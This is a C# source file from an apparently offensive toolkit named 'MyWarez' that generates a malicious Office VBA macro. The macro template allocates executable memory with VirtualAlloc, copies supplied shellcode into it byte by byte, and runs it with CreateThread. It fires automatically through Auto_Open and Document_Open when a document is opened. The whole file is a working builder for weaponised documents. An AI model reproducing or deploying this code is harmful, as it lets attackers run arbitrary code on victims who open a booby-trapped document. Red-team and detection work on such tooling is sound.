using MyWarez.Core;
using System.Text;

namespace MyWarez.Base
{
    public class ShellcodeVbaMacro : IPayload, IVbaMacro
    {
        public ShellcodeVbaMacro(IShellcode shellcode)
        {
            Shellcode = shellcode;
        }
        public PayloadType Type { get; } = PayloadType.VbaMacro;

        protected IShellcode Shellcode { get; }

        private static string ByteTemplate = "sc({0}) = {1}\r\n";

        protected string Template { get; } =
@"
#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib ""kernel32"" ( _
		ByVal lpThreadAttributes As Long, _
		ByVal dwStackSize As Long, _ 
		ByVal lpStartAddress As LongPtr, _
		lpParameter As Long, _
		ByVal dwCreationFlags As Long, _ 
		lpThreadId As Long) As LongPtr


	Private Declare PtrSafe Function VirtualAlloc Lib ""kernel32"" ( _
		ByVal lpAddress As Long, _
		ByVal dwSize As Long, _
		ByVal flAllocationType As Long, _
		ByVal flProtect As Long) As LongPtr 

	Private Declare PtrSafe Function RtlMoveMemory Lib ""kernel32"" ( _
		ByVal Destination  As LongPtr, _
		ByRef Source As Any, _
		ByVal Length As Long) As LongPtr

#Else
	Private Declare Function CreateThread Lib ""kernel32"" ( _
		ByVal lpThreadAttributes As Long, _
		ByVal dwStackSize As Long, _
		ByVal lpStartAddress As Long, _
		lpParameter As Long, _
		ByVal dwCreationFlags As Long, _
		lpThreadId As Long) As Long

	Private Declare Function VirtualAlloc Lib ""kernel32"" ( _
		ByVal lpAddress As Long, _
		ByVal dwSize As Long, _
		ByVal flAllocationType As Long, _
		ByVal flProtect As Long) As Long

	Private Declare Function RtlMoveMemory Lib ""kernel32"" ( _
		ByVal Destination As Long, _
		ByRef Source As Any, _
		ByVal Length As Long) As Long
#EndIf

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Function Run()
    On Error Resume Next

	Dim source As Long, i As Long
#If Vba7 Then
	Dim  lpMemory As LongPtr, lResult As LongPtr
#Else
	Dim  lpMemory As Long, lResult As Long
#EndIf

Dim sc({0}) As Byte
{1}

	lpMemory = VirtualAlloc(0, UBound(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	For i = LBound(sc) To UBound(sc)
		source = sc(i)
		lResult = RtlMoveMemory(lpMemory + i, source, 1)
	Next i
	lResult = CreateThread(0, 0, lpMemory, 0, 0, 0)

End Function

Sub Auto_Open()
    Run
End Sub

Sub Document_Open()
    Run
End Sub
";
        public string Text
        {
            get
            {
                var sc = Shellcode.Bytes;
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < sc.Length; i++)
                {
                    builder.Append(string.Format(ByteTemplate, i, (int)sc[i]));
                }
                string script = string.Format(Template, sc.Length, builder.ToString());
                return script;
            }
        }
    }
}